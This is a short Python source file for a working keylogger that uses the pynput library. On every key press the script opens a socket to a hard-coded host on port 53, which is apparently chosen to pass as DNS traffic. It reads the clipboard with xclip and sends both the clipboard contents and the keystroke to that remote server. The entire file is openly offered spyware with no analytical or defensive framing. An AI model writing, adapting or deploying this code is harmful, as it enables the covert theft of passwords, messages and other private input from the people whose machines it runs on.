import threading
import socket
import subprocess
from pynput import keyboard  # Ensure this is imported

# Server address and port
SERVER_ADDRESS = ("192.168.111.223", 53)

class keylogger:
    def Keylogging(self):
        def on_key_press(key):
            try:
                # Connect to the server
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect((SERVER_ADDRESS[0], SERVER_ADDRESS[1]))

                try:
                    # Read clipboard data using xclip
                    clipboard_data = subprocess.check_output(["xclip", "-selection", "clipboard", "-o"]).decode().strip()
                    server.send(f'Clipboard data: {clipboard_data}\n'.encode())
                except Exception as e:
                    server.send(f'Failed to fetch clipboard data: {e}\n'.encode())

                # Send keystroke data
                server.send(f'Keystroke: {key}\n'.encode())
                server.close()
            except Exception as e:
                print(f"Error connecting to server: {e}")

        # Create a listener for key presses
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    try:
        # Create an object of the keylogger class
        obj = keylogger()

        # Start keylogging in a separate thread
        t1 = threading.Thread(target=obj.Keylogging, daemon=True)
        t1.start()
        t1.join()

    except KeyboardInterrupt:
        pass
